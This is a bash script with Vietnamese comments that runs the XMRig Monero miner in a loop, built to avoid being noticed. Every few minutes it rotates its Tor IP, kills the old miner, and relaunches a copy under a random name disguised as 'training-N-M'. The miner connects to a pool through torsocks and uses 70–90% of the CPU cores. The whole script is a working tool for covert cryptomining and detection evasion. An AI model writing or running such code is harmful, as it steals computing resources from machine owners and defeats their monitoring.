#!/bin/bash

while true; do
  # Thời gian ngủ ngẫu nhiên từ 5 đến 10 phút
  sleep $((RANDOM % 300 + 300))

  echo "Đang yêu cầu Tor thay đổi IP..."
  kill -HUP $(pgrep tor)
  echo "Tor đã thay đổi IP."

  # Dừng XMRig với tên cũ
  if [ -f /root/xmrig_name.txt ]; then
    RANDOM_NAME=$(cat /root/xmrig_name.txt)
    pkill -f $RANDOM_NAME
    rm -f /root/xmrig_name.txt
  fi

# Lấy tổng số lõi CPU
TOTAL_CORES=$(nproc)

# Chọn một tỷ lệ phần trăm ngẫu nhiên từ 70 đến 90
RANDOM_PERCENT=$(shuf -i 70-90 -n 1)

# Tính số threads dựa trên tổng số lõi và tỷ lệ phần trăm đã chọn
CPU_HINT=$(echo "($TOTAL_CORES * $RANDOM_PERCENT) / 100" | bc)


  # Tạo tên mới cho XMRig
  RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
  cp /root/work/xmrig-${VERSION}/xmrig_backup /root/work/$RANDOM_NAME
  chmod +x /root/work/$RANDOM_NAME
  echo $RANDOM_NAME > /root/xmrig_name.txt

  echo "Chạy lại XMRig với tên mới $RANDOM_NAME và sử dụng $CPU_HINT lõi CPU..."
  torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --threads=$CPU_HINT

done
